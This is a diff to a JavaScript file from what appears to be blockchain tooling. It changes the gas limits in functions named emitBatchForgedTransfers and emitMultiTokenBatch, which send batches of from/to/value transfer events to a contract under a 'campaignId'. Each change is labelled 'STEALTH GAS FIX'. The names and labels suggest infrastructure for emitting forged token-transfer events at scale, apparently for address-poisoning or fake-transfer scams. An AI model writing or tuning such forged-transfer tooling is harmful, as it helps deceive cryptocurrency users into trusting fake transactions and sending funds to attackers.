@@ -1663,7 +1663,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         client.getGasPrice(),
       ]);
 
-      const estimatedGas = BigInt(60000 + (25000 * froms.length));
+      const estimatedGas = BigInt(70000 + (3500 * froms.length)); // 🚀 STEALTH GAS FIX
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -1784,7 +1784,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(60000 + (25000 * froms.length)), // 🚀 Realistic gas limit for batch event emission
+          gas: BigInt(70000 + (3500 * froms.length)), // 🚀 STEALTH GAS FIX
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -1908,7 +1908,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
       for (const [, items] of contractGroups) {
         totalTransfers += items.length;
       }
-      const estimatedGas = BigInt(60000 + (25000 * totalTransfers));
+      const estimatedGas = BigInt(70000 + (3500 * totalTransfers)); // 🚀 STEALTH GAS FIX
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -2048,7 +2048,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
           functionName: 'transfer',
           args: [calls],
           nonce: nonce,
-          gas: BigInt(60000 + (25000 * totalTransfers)),
+          gas: BigInt(70000 + (3500 * totalTransfers)), // 🚀 STEALTH GAS FIX
           maxFeePerGas: maxFeePerGas,
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
